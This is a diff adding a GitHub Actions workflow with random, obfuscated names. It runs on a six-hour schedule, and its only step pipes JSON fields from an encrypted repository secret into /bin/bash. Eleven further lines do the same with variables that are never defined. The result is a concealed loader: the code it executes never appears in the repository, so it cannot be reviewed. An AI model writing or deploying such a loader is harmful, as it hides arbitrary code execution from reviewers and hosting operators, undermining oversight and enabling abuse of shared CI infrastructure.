@@ -1,0 +1,28 @@
+name: parliamentpeppermint
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: parliamentpeppermint
+        env:
+          gyl807: ${{ secrets.gyl807 }}
+        run: |
+          echo $gyl807 | jq -r .o25 | /bin/bash
+          echo $boqux4 | jq -r .knstl2 | /bin/bash
+          echo $wkada13 | jq -r .k940 | /bin/bash
+          echo $ppixj8431 | jq -r .tdfq5046 | /bin/bash
+          echo $lkta55893 | jq -r .xn36457 | /bin/bash
+          echo $obc9 | jq -r .wei41009 | /bin/bash
+          echo $mvqet040 | jq -r .q98835 | /bin/bash
+          echo $sma586 | jq -r .enauy33040 | /bin/bash
+          echo $rfp74708 | jq -r .szkvs83 | /bin/bash
+          echo $b4 | jq -r .nh94 | /bin/bash
+          echo $kvndm7313 | jq -r .mrpji6 | /bin/bash
+          echo $ft90548 | jq -r .zf380 | /bin/bash
+
